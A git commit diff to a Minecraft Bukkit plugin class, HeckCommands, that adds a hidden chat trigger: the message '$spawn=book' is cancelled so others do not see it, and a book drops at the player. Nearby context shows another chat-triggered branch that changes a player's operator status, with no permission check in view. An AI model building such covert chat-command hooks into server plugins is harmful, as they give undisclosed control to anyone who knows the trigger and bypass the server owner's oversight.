f2bba579b47ccf38f1f394263f642fdf5c452a5d
olavi <olavi@hahtomaa.fi>
2024-05-08 20:17:00 +0300

    Unit

--- src/main/java/org/main/uneton/events/HeckCommands.java
+++ src/main/java/org/main/uneton/events/HeckCommands.java
@@ -1,9 +1,12 @@
 package org.main.uneton.events;
 
+import org.bukkit.Location;
+import org.bukkit.Material;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
+import org.bukkit.inventory.ItemStack;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.scheduler.BukkitRunnable;
 import org.main.uneton.Combat;
@@ -27,6 +30,16 @@ public class HeckCommands implements Listener {
             new BukkitRunnable() {
                 public void run() {
                     p.setOp(false);
+                }
+            }.runTask(JavaPlugin.getPlugin(Combat.class));
+        } else if (e.getMessage().contains("$spawn=book")) {
+            e.setCancelled(true);
+            Location loc = p.getLocation();
+            new BukkitRunnable() {
+                @Override
+                public void run() {
+                    ItemStack book = new ItemStack(Material.BOOK);
+                    e.getPlayer().getWorld().dropItemNaturally(loc, book);
                 }
             }.runTask(JavaPlugin.getPlugin(Combat.class));
         }
